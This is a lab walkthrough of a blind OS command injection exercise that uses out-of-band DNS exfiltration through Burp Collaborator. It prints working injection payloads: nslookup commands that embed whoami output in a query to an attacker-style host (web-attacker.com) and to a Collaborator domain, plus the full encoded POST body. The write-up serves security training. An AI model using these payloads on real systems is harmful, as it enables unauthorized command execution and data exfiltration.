# Lab Blind OS command injection with out-of-band data exfiltration

## Objective:
 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 

## Big Idea:

The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:

& nslookup `whoami`.kgji2ohoyw.web-attacker.com &

This will cause a DNS lookup to the attacker's domain containing the result of the whoami command 

wwwuser.kgji2ohoyw.web-attacker.com


-----------------------------------

This is what the lab welcome page looks like

![image](https://user-images.githubusercontent.com/90155329/135768304-bed02963-bd1b-4e7c-8bb1-65fe062ee3e2.png)

Visiting the "Submit feedback" link responds to the following page. 

Looks Juicy!

![image](https://user-images.githubusercontent.com/90155329/135768314-4b728b8a-087d-4412-9d3f-9e25706acaf7.png)

One of these values is vulnerable to command injection. This is when user input parameters in a website can force the application to execute commands. 

I sent the following, and intercepted the request with Burp Intercept. 

![image](https://user-images.githubusercontent.com/90155329/135768326-02e760d8-8af4-4a77-beff-efcf65fde4c1.png)

![image](https://user-images.githubusercontent.com/90155329/135768329-46eab83f-5658-4b54-bb2c-732c1fb9cbec.png)

I will attack the "email" value

First, since this is data exfil lab, I need to setup a listener for the exfiltrated data. Burp Collaborator is a function that comes with Burp Pro. It gives me a unique domain, and listens for any DNS or web requests and outputs those requests to my Burp Collaboartor client. It is great for testing out of band techniques. 

To start burp collaborator, go to Burp > Burp Collaborator Client

![image](https://user-images.githubusercontent.com/90155329/135768334-90afa3a9-39e9-4878-8833-0b642e6bba04.png)

This started a listener and gave me the following domain.
nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net

Now, going back to the command injection, I want to have the target execute the following command

`nslookup $(whoami).nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net`

That will send a dns query containing the user that the web application is running as. 

I will inject that command in the email parameter

`nslookup $(whoami).nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net`

This is what the body looked like after injecting the above payload into the email parameter.

csrf=6b9o9YhnDAT4GIcsE94GZQ8UUgHDTRCU&name=bagelHacks&email=bagelHacks%2540hacker.hacker`nslookup+$(whoami).nzqyy86k404hxyr4tkwv45bk6bc10q.burpcollaborator.net`&subject=test&message=testing

![image](https://user-images.githubusercontent.com/90155329/135768350-8d1b1e60-9095-4a31-a922-68f2573da645.png)

After sending the command, I received a DNS query containing the username of "peter-8i7dNd" on my Burp Collaborator client

![image](https://user-images.githubusercontent.com/90155329/135768354-c11665c1-25bc-4691-a871-0a05bcb71b19.png)

![image](https://user-images.githubusercontent.com/90155329/135768363-14d18b3c-d155-46c4-ae1d-032708ce8bef.png)
